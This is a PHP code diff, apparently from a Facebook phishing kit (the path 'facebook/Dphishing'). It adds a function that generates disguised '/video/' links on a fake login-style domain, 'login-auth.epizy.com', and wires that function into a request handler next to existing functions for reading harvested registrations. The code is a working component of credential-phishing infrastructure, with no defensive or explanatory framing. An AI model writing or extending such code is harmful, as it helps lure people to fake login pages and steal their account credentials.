@@ -40,6 +40,28 @@ function dataByRegister($fileName)
     }
     return $res;
 }
+function generateURL($url){
+    $res = [];
+    if ($url){
+        $urls = json_decode(file_get_contents('url.json'), true);
+        $idURL = hash('CRC32',$url);
+        $urls[$idURL] = $url;
+        file_put_contents('url.json',json_encode($urls));
+        if ($_SERVER['HTTP_HOST'] == 'localhost') {
+            $urlGenerated = 'http://localhost/facebook/Dphishing/video/'.$idURL;
+        }else{
+            $urlGenerated = 'http://login-auth.epizy.com/video/'.$idURL;
+        }
+        $res['status'] = 200;
+        $res['message'] = 'URL generada correctamente';
+        $res['data'] = $urlGenerated;
+    }else{
+        $res['status'] = 400;
+        $res['message'] = 'Ocurrio un error en la creacion de URL';
+        $res['data'] = null;
+    }
+    return $res;
+}
 function nofunction()
 {
     $res = [];
@@ -59,6 +81,9 @@ switch ($function) {
         break;
     case 'findRegisters':
         $response = findRegisters();
+        break;
+    case 'generateURL':
+        $response = generateURL($data);
         break;
     default:
         $response = nofunction();
